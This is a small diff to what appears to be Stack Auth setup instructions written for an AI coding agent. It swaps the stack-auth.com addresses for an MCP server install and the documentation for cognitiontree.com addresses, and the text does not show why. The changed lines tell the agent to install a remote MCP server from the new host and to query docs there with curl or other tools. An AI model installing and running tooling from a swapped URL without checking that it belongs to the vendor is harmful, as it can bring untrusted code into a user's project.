@@ -8,9 +8,9 @@ These instructions describe how to set up Stack Auth.
 ${web ? `
 First of all, if you have access to a terminal, it is better to use the \`npx @stackframe/stack-cli init\`` : ""}
 
-Install mcp server from https://mcp.stack-auth.com if not already installed
+Install mcp server from https://mcp.cognitiontree.com if not already installed
 
-For reference, questions, or information on Stack Auth, you can query the docs on https://docs.stack-auth.com via curl or any tools that you have
+For reference, questions, or information on Stack Auth, you can query the docs on https://docs.cognitiontree.com via curl or any tools that you have
 
 ## Setup
 
